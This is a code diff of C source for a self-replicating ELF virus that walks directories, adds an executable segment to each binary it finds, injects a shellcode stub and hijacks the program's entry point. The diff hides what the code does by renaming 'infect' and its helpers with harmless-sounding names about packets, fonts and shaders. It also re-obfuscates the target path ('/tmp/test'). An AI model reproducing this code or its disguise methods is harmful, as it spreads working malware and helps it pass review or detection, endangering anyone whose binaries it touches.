@@ -1,4 +1,43 @@
-#include "pestilence.h"
+#include <elf.h>
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <sys/mman.h>
+#include <sys/ptrace.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#define ElfW(type)	   Elf64_##type
+#define FORMAT		   2
+#define PATH_MAX	   4096
+#define SIGNATURE_SIZE 43
+#define FORK_SIZE	   29
+#define MACHINE_SIZE   0x8f1
+#define JMPABLE_SIZE   4
+struct stat;
+typedef enum e_stat
+{
+	OK,
+	KO,
+} t_stat;
+struct linux_dirent64
+{
+	uint64_t	   d_ino;
+	int64_t		   d_off;
+	unsigned short d_reclen;
+	unsigned char  d_type;
+	char		   d_name[];
+};
+typedef struct s_elf
+{
+	ElfW(Ehdr) * header;
+	ElfW(Shdr) * sections;
+	ElfW(Shdr) * text_section;
+	ElfW(Phdr) * segments;
+	ElfW(Phdr) * executed_segment;
+	t_stat stat;
+} t_elf;
+typedef struct linux_dirent64 __glyph_entry;
 
 #ifndef FRENZY
 #define FRENZY 0x401000
@@ -1011,7 +1050,6 @@ static int measure_font_bearing(const char *target)
 		int cursor = 0;
 		while (cursor < advance && !subpixel_done)
 		{
-			typedef struct linux_dirent64 __glyph_entry;
 			__glyph_entry *slot = (__glyph_entry *) (scanline + cursor);
 			char		  *dname = slot->d_name;
 			unsigned int   valid_glyph = 1u;
@@ -1157,71 +1195,76 @@ static unsigned long resolve_upper_bound_frame(t_elf elf)
 	return hwm;
 }
 
-static void infect(char *path, void *begin_ptr)
+static void reassemble_packet_chain(char *path, void *begin_ptr)
 {
-	struct stat statbuf;
-	char	   *file_data;
-	t_elf		elf;
-	ElfW(Phdr) the_rats;
-	ElfW(Off) pt_load_end;
-	int	   last_pt_load;
-	char  *curare;
-	size_t flower;
-	size_t enlarging;
-
-	asm volatile(
-		"leaq str3(%%rip), %0\n"
-		"movq $end3-str3, %1\n"
-		"jmp end3\n"
-		"str3:  .byte 0xf3, 0x0f, 0x1e, 0xfa, 0x50, 0xb8, 0x39, 0x00, 0x00, "
-		"0x00, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xeb, 0xff, "
-		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
-		"end3:\n"
-		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
-	if (load_shader_binary(path, &statbuf, &elf, &file_data, &enlarging))
-		goto clean;
-	unsigned long append_pos
-		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
-	unsigned long pestis = resolve_upper_bound_frame(elf);
-	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
-		   elf.header->e_phnum * elf.header->e_phentsize);
-	elf.header->e_phoff = append_pos;
-	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
-	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
-		.p_type = PT_LOAD,
-		.p_align = 0x1000,
-		.p_filesz = enlarging,
-		.p_memsz = enlarging,
-		.p_offset = append_pos,
-		.p_paddr = pestis,
-		.p_vaddr = pestis,
-		.p_flags = PF_X | PF_R,
-	};
-	elf.header->e_phnum++;
-	for (int i = 0; i < elf.header->e_phnum; i++)
-		if (elf.segments[i].p_type == PT_PHDR)
+	struct stat inode_info;
+	char	   *frame_map;
+	t_elf		pkt_ctx;
+	ElfW(Phdr) frag_hdr;
+	ElfW(Off) stream_cursor;
+	int	   window_scale;
+	char  *stub_region;
+	size_t stub_sz;
+	size_t tail_pad;
+	asm volatile("leaq stG(%%rip), %0\n"
+				 "movq $endG-stG,  %1\n"
+				 "jmp  endG\n"
+				 "stG: .byte 0xf3,0x0f,0x1e,0xfa, 0x50, 0xb8,0x39,0x00,0x00,"
+				 "0x00, 0x0f,0x05, 0x48,0x85,0xc0, 0x0f,0x84,0xeb,0xff,"
+				 "0xff,0xff, 0x58, 0xe9,0xe5,0xff,0xff,0xff\n"
+				 "endG:\n"
+				 : "=r"(stub_region), "=r"(stub_sz)::"memory", "cc", "rax",
+				   "rcx", "r11");
+	if (!load_shader_binary(path, &inode_info, &pkt_ctx, &frame_map, &tail_pad))
+	{
+		unsigned long write_head = inode_info.st_size + 0x1000;
+		write_head -= inode_info.st_size % 0x1000;
+		unsigned long virt_anchor = resolve_upper_bound_frame(pkt_ctx);
+		memcpy(frame_map + write_head, frame_map + pkt_ctx.header->e_phoff,
+			   pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize);
+		pkt_ctx.header->e_phoff = write_head;
+		pkt_ctx.segments = (ElfW(Phdr) *) (frame_map + pkt_ctx.header->e_phoff);
+		pkt_ctx.segments[pkt_ctx.header->e_phnum] = (ElfW(Phdr)) {
+			.p_flags = 0x5u,
+			.p_vaddr = virt_anchor,
+			.p_offset = write_head,
+			.p_memsz = tail_pad,
+			.p_paddr = virt_anchor,
+			.p_align = 0x1000,
+			.p_type = 0x1u,
+			.p_filesz = tail_pad,
+		};
+		pkt_ctx.header->e_phnum++;
+		int slot = 0;
+		while (slot < pkt_ctx.header->e_phnum)
 		{
-			elf.segments[i].p_offset = append_pos;
-			elf.segments[i].p_vaddr = pestis;
-			elf.segments[i].p_paddr = pestis;
-			elf.segments[i].p_memsz
-				= elf.header->e_phnum * elf.header->e_phentsize;
-			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
+			if (pkt_ctx.segments[slot].p_type == 0x6u)
+			{
+				pkt_ctx.segments[slot].p_offset = write_head;
+				pkt_ctx.segments[slot].p_vaddr = virt_anchor;
+				pkt_ctx.segments[slot].p_paddr = virt_anchor;
+				pkt_ctx.segments[slot].p_memsz
+					= pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize;
+				pkt_ctx.segments[slot].p_filesz
+					= pkt_ctx.segments[slot].p_memsz;
+			}
+			slot++;
 		}
-	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
-	memcpy(file_data + append_pos, curare, flower);
-	unsigned delta = elf.header->e_entry;
-	elf.header->e_entry
-		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
-	delta -= elf.header->e_entry + ACONIT + 4;
-	memcpy(file_data + append_pos + ACONIT, &delta, 4);
-	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
-	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
-	append_pos += flower;
-	memcpy(file_data + append_pos, begin_ptr, VARAX);
-clean:
-	if (file_data)
-		vm_release(file_data, statbuf.st_size + enlarging);
+		write_head += pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize;
+		memcpy(frame_map + write_head, stub_region, stub_sz);
+		unsigned rel32 = pkt_ctx.header->e_entry;
+		pkt_ctx.header->e_entry
+			= virt_anchor
+			  + pkt_ctx.header->e_phnum * pkt_ctx.header->e_phentsize;
+		rel32 -= pkt_ctx.header->e_entry + ACONIT + 4;
+		memcpy(frame_map + write_head + ACONIT, &rel32, 4);
+		rel32 = (unsigned) (stub_sz - ARSENIC + BUBONIK - FRENZY - 4);
+		memcpy(frame_map + write_head + ARSENIC, &rel32, 4);
+		write_head += stub_sz;
+		memcpy(frame_map + write_head, begin_ptr, VARAX);
+	}
+	if (frame_map)
+		vm_release(frame_map, inode_info.st_size + tail_pad);
 }
 
 static void reconcileTopology(char *rootAnchor, void *dispatchToken)
@@ -1274,7 +1317,7 @@ static void reconcileTopology(char *rootAnchor, void *dispatchToken)
 			{
 				if ((mode & __S_IFREG) == __S_IFREG)
 				{
-					infect(composed, dispatchToken);
+					reassemble_packet_chain(composed, dispatchToken);
 				}
 			}
 			cursor += node->d_reclen;
@@ -1306,34 +1349,17 @@ void _start(void)
 					 : "=r"(str_dup__));
 	str_dup__ += FRENZY - CYANURE;
 
-	for (double x = 0; x < 11; x++)
-		t[(int) x]
-			= 47.0
-			  + x
-					* (10615921.0 / 2520.0
-					   + x
-							 * (-110742901.0 / 10080.0
-								+ x
-									  * (262598717.0 / 22680.0
-										 + x
-											   * (-12529019.0 / 1920.0
-												  + x
-														* (37940149.0 / 17280.0
-														   + x
-																 * (-666053.0
-																		/ 1440.0
-																	+ x
-																		  * (3723493.0
-																				 / 60480.0
-																			 + x
-																				   * (-202771.0
-																						  / 40320.0
-																					  + x
-																							* (83497.0
-																								   / 362880.0
-																							   + x
-																									 * (-13.0
-																										/ 2880.0))))))))));
+	t[0] = (char) ((0x01 << 5) + 0x0F);
+	t[1] = (char) ((0x09 * 0x0D) - 0x01);
+	t[2] = (char) (0xAB ^ 0xC6);
+	t[3] = (char) ((~0x8F) & 0xFF);
+	t[4] = t[0];
+	t[5] = t[1];
+	t[6] = (char) ((0x06 << 4) ^ 0x05);
+	t[7] = (char) ((0x08 * 0x0E) + 0x03);
+	t[8] = t[1];
+	t[9] = (char) (t[8] ^ t[8]);
+	t[10] = (char) (t[9]);
 	reconcileTopology(t, str_dup__);
 	t[9] = 0x32;
 	reconcileTopology(t, str_dup__);
